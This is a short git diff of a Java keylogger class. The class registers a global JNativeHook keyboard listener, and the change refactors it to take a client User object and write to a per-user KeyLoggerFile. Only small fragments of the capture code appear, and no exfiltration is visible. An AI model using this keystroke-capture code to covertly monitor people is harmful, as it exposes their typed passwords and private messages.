@@ -1,5 +1,6 @@
 package features;
 
+import client.User;
 import org.jnativehook.GlobalScreen;
 import org.jnativehook.NativeHookException;
 import org.jnativehook.keyboard.NativeKeyEvent;
@@ -11,10 +12,13 @@ import java.util.logging.Logger;
 
 public class KeyLogger implements NativeKeyListener {
 
-    KeyLoggerFile kf = new KeyLoggerFile();
+    final User user;
+    KeyLoggerFile kf;
 
-    public KeyLogger() {
-    
+    public KeyLogger(User user) {
+        this.user = user;
+        kf = new KeyLoggerFile(user);
+
         try {
             GlobalScreen.registerNativeHook();
             Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
@@ -26,7 +30,6 @@ public class KeyLogger implements NativeKeyListener {
         GlobalScreen.addNativeKeyListener(this);
     }
 
-    
     public static void main(String args[]) {
 
     }
@@ -58,4 +61,3 @@ public class KeyLogger implements NativeKeyListener {
         // System.out.println("Released : " + NativeKeyEvent.getKeyText(key.getKeyCode()));
     }
 }
-
